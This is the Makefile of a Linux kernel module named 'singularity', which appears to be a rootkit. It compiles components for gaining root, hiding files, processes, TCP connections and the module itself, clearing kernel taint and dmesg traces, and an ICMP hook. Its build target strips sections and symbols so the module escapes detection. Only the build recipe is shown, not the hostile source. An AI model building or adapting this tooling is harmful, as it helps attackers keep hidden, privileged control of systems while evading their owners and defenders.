obj-m += singularity.o

# essentially a debug mode
ifdef DONT_HIDE
else
	MODE_DEFS = -DHIDE_MODULE=1
endif

ccflags-y := -std=gnu99 \
	-Wno-declaration-after-statement \
	-fvisibility=hidden \
	$(MODE_DEFS)

singularity-objs := main.o \
    modules/reset_tainted.o \
    modules/become_root.o \
    modules/hiding_directory.o \
    modules/hiding_tcp.o \
    modules/hooking_insmod.o \
    modules/clear_taint_dmesg.o \
    modules/hidden_pids.o \
    modules/hiding_stat.o \
    modules/hooks_write.o \
    modules/hiding_chdir.o \
    modules/hiding_readlink.o \
    modules/open.o \
    modules/bpf_hook.o \
    modules/icmp.o \
    modules/hide_module.o modules/trace.o ftrace/ftrace_helper.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	# removing artifacts from the module
	objcopy --remove-section=__mcount_loc \
		--remove-section=.comment \
		--remove-section=".note*" \
		-X --keep-global-symbol='' --strip-unneeded singularity.ko
	# seem to have to strip unneeded twice
	objcopy --strip-unneeded singularity.ko
	# if we remoce symbols from .strtab they'll be hidden from the kernel and
	# not be shown
	python3 ./scripts/remove_symtab.py ./singularity.ko

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
